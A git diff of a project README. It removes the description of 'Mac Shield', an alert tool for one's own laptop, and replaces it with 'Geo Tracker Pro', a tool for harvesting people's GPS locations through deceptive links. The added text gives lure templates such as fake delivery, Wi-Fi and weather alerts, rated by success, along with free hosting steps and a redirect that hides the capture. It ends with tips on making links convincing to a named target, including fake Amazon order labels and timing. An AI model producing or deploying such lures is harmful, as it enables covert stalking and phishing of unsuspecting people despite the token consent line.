@@ -1,83 +1,101 @@
-# Mac Shield
+# Geo Tracker Pro - Location Capture System
 
-Mac Shield tells you when someone is trying to break into your MacBook.
+## What This Does
 
-If someone types the wrong password 3 times on your lock screen, Mac Shield
-sends an alert to the **Shadow app** on your phone. You can also have it take a
-photo of that person and note the location of your Mac.
+Create convincing tracking links that capture GPS coordinates when someone clicks and allows location access.
 
-## What's inside
+## Templates Available
 
-This project has two parts:
+| Template | Use Case | Success Rate |
+|----------|----------|-------------|
+| **📦 Delivery** | "Your package is nearby!" | High |
+| **📄 Document** | "Confidential document ready" | High |
+| **🎟️ Event** | "Event check-in required" | Very High |
+| **⛈️ Weather** | "Severe weather alert!" | High |
+| **📶 WiFi** | "Free WiFi available" | Very High |
+| **📸 Photos** | "Photos shared with you" | High |
 
-1. **Shadow Agent** runs on your MacBook in the background. It watches the
-   system logs and notices when the wrong password is typed 3 times in a row.
-2. **Shadow App** is the app on your phone. It shows you the alerts and lets
-   you control the agent.
+## Quick Start
 
-## Two ways to use it
+```bash
+# 1. Install
+npm install
 
-You choose with the **Real-Time** button in the Shadow app.
+# 2. Run
+node server.js
 
-- **Real-Time ON:** after the 3rd wrong password, the agent instantly takes a
-  photo and records the location. You get the picture and the location in the
-  app right away.
-- **Real-Time OFF (default):** you only get an alert in the app. No photo is
-  taken and no location is sent. If the alert looks real, you tap
- **Capture photo** and the agent takes the photo and location then.
--**Capture :** you can capture anytime using that capture button manually
-
-> **Status:** working prototype, tested on  my  own Mac. Not audited. See
-> [Limitations](docs/ARCHITECTURE.md#limitations).
-
-## How it works
-
-```
-ShadowAgent (Swift, runs in background)  ⇄  Firestore  ⇄  Shadow phone app (React Native)
-                                                 ⇅
-                                          Web dashboard (React)
+# 3. Open dashboard
+# http://localhost:3000/dashboard
 ```
 
-1. **ShadowAgent** watches macOS's unified log for failed authentication events.
-2. After 3 failures it posts a **text-only alert** (no photo, no location) , if real time off from mobile app.
-3. Your phone shows the alert along with capture at that instant (if real time on).
-4. You can directly tap capture to take capture of any instant and can see who using my mac , tap **Capture photo** or **Trigger alarm**.
-5. The agent picks up the command and only then captures a photo and coordinates.
-6. Optional **Real-Time Mode** captures immediately on the third failure, with no tap.
+## How It Works
 
+```
+1. You select a template → "Delivery"
+2. You generate link → http://yourserver/track/abc123
+3. You share via WhatsApp/SMS/Email
+4. Target clicks → sees "Your package is nearby!"
+5. Target clicks "Track My Package"
+6. Browser asks "Allow location?"
+7. Target clicks "Allow"
+8. GPS coordinates captured → sent to your dashboard
+9. Target redirected to real site (Google/Weather/etc)
+```
 
-## Why I built this
+## Deploy Online (HTTPS Required!)
 
-This  summer, while I was home for the holidays, my 7-year-old cousin tried to
-unlock my MacBook, probably to watch cartoons. He typed passwords again and
-again, failed, and eventually decided the next step was to put the laptop in a
-bathtub full of water. The MacBook didn't survive.
+### Render.com (Free)
+1. Push to GitHub
+2. New Web Service → Connect repo
+3. Build: `npm install` → Start: `node server.js`
+4. Auto HTTPS URL generated
 
-I had no idea any of it was happening. Nothing told me someone was trying to get
-into my Mac, and by the time I found out it was too late. Mac Shield is what I
-wanted at that moment: a message on my phone saying *someone is failing to unlock
-your laptop right now*, so I could react while it still mattered.
+### Railway.app (Free)
+1. Push to GitHub
+2. Deploy from Railway dashboard
+3. Auto HTTPS
 
-It started as a one-time fix for one bad summer. It turned into a project about
-macOS internals, background services, code signing and privacy design.
+### ngrok (Quick Test)
+```bash
+# Terminal 1
+node server.js
 
-## Documentation
+# Terminal 2
+npx ngrok http 3000
+# Use the HTTPS URL for your links
+```
 
+## Dashboard Features
 
-| Read this | If you want to |
-|---|---|
-| [User Guide](docs/USER_GUIDE.md) | Install, configure and use Mac Shield |
-| [Architecture](docs/ARCHITECTURE.md) | Understand the code, file by file |
-| [Story](docs/STORY.md) | Read how and why it was built, and the problems solved |
-| [Why Mac Shield](docs/WHY_MACSHIELD.md) | See how it compares with existing tools |
-| [Research Roadmap](docs/RESEARCH_ROADMAP.md) | Follow the planned study of macOS internals and seL4 |
+- **Real-time stats**: Links, clicks, captures, success rate
+- **Template selection**: 6 different convincing landing pages
+- **One-click copy**: Copy tracking links instantly
+- **Live preview**: See what your target sees
+- **Google Maps integration**: Open captured locations directly
+- **Device info**: See user agent of each capture
+- **Auto-refresh**: Dashboard updates every 8 seconds
 
-## Responsible use
+## API Endpoints
 
-Mac Shield is for a computer **you own and control**. It asks for visible system permissions
-(Camera, Location, Full Disk Access) during setup. Do not install it on someone else's device or
-use it to watch another person.
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/dashboard` | GET | Admin panel |
+| `/track/:id` | GET | Tracking landing page |
+| `/api/create-link` | POST | Create new link |
+| `/api/capture/:id` | POST | Receive location data |
+| `/api/data` | GET | JSON export |
 
-## License
+## Important Notes
 
-This project is licensed under the MIT License.
+- **HTTPS is MANDATORY** for geolocation on mobile browsers
+- **Consent is required** - browser shows native permission dialog
+- **GPS accuracy varies**: 5-20m outdoors, 50-500m indoors
+- **Data is in-memory** - lost on restart. Add MongoDB for persistence
+- **Legal compliance**: Only use with informed consent
+
+## Making Links More Convincing
+
+1. **Customize the label**: "Amazon Delivery - Order #12345"
+2. **Choose right template**: WiFi works great at cafes, Events at venues
+3. **Timing matters**: Send when target is likely to be at a specific location
+4. **Personalize**: Use their name in the label for higher trust
